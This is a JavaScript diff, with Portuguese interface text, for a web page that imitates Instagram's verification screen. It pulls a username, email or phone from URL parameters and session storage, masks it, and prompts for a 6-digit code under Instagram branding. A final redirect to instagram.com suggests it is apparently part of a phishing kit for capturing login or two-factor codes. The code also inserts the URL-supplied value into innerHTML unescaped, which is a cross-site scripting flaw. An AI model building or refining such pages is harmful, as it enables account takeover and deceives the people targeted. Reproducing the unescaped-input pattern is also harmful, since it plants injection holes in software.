@@ -11,31 +11,72 @@ const URL_FINAL = "https://www.instagram.com";
 const urlParams = new URLSearchParams(window.location.search);
 const identifier = urlParams.get('usuario') || urlParams.get('username') || sessionStorage.getItem('loginIdentifier') || sessionStorage.getItem('ig_usuario') || '';
 
+const instructionsBox = document.querySelector('#instructions-box') || document.querySelector('.instructions');
+
+function detectarTipo(val) {
+  if (!val) return 'usuario';
+  const s = String(val).trim();
+  if (s.includes('@') && s.includes('.')) return 'email';
+  const digitos = s.replace(/\D/g, '');
+  if (digitos.length >= 8 && /^\+?[\d\s().-]{8,22}$/.test(s)) {
+    return 'telefone';
+  }
+  return 'usuario';
+}
+
 function maskEmail(email) {
-  const [name, domain] = email.split('@');
+  const [name, domain] = String(email).trim().split('@');
   if (!domain) return email;
   if (name.length <= 2) return `${name[0] || ''}***@${domain}`;
-  return `${name[0]}${'*'.repeat(Math.max(3, name.length - 2))}${name.slice(-1)}@${domain}`;
+  return `${name[0]}${'*'.repeat(Math.min(5, Math.max(3, name.length - 2)))}${name.slice(-1)}@${domain}`;
 }
 
 function maskPhone(phone) {
-  const digits = phone.replace(/\D/g, '');
-  if (digits.length < 3) return phone;
-  return `${'*'.repeat(Math.max(3, digits.length - 2))}${digits.slice(-2)}`;
+  const digits = String(phone).replace(/\D/g, '');
+  if (digits.length < 8) return phone;
+  if (digits.length === 11) {
+    const ddd = digits.slice(0, 2);
+    const finalDigitos = digits.slice(-4);
+    return `(${ddd}) *****-${finalDigitos}`;
+  }
+  if (digits.length === 13 && digits.startsWith('55')) {
+    const ddd = digits.slice(2, 4);
+    const finalDigitos = digits.slice(-4);
+    return `+55 (${ddd}) *****-${finalDigitos}`;
+  }
+  return `******${digits.slice(-4)}`;
 }
 
-function isPhone(value) {
-  return /^\+?[\d\s().-]{7,}$/.test(value);
+function formatUsername(user) {
+  let u = String(user).trim();
+  if (!u.startsWith('@')) u = `@${u}`;
+  return u;
 }
 
-if (identifier) {
-  if (identifier.includes('@')) {
-    maskedIdentifier.textContent = maskEmail(identifier);
-  } else if (isPhone(identifier)) {
-    verificationTitle.textContent = 'Verifique seu telefone';
-    maskedIdentifier.textContent = maskPhone(identifier);
-  } else {
-    maskedIdentifier.textContent = identifier;
+const tipoParam = urlParams.get('tipo') || sessionStorage.getItem('tipo_identificador');
+const tipoIdentificador = tipoParam || detectarTipo(identifier);
+
+if (tipoIdentificador === 'email') {
+  document.title = "Verifique seu email • Instagram";
+  if (verificationTitle) verificationTitle.textContent = "Verifique seu email";
+  if (instructionsBox) {
+    const masked = maskEmail(identifier || 'seu email');
+    instructionsBox.innerHTML = `Insira o código de 6 dígitos que enviamos para <span id="masked-identifier" style="font-weight:600; color:#ffffff;">${masked}</span>`;
+  }
+} else if (tipoIdentificador === 'telefone') {
+  document.title = "Confirme seu número de celular • Instagram";
+  if (verificationTitle) verificationTitle.textContent = "Confirme seu número de celular";
+  if (instructionsBox) {
+    const masked = maskPhone(identifier || 'seu celular');
+    instructionsBox.innerHTML = `Insira o código de 6 dígitos enviado por SMS para <span id="masked-identifier" style="font-weight:600; color:#ffffff;">${masked}</span>`;
+  }
+} else {
+  // Nome de usuário
+  document.title = "Confirme sua identidade • Instagram";
+  if (verificationTitle) verificationTitle.textContent = "Confirme sua identidade";
+  if (instructionsBox) {
+    const userFmt = formatUsername(identifier || 'sua conta');
+    instructionsBox.innerHTML = `Insira o código de 6 dígitos enviado para o contato associado a <span id="masked-identifier" style="font-weight:600; color:#ffffff;">${userFmt}</span>`;
   }
 }
 
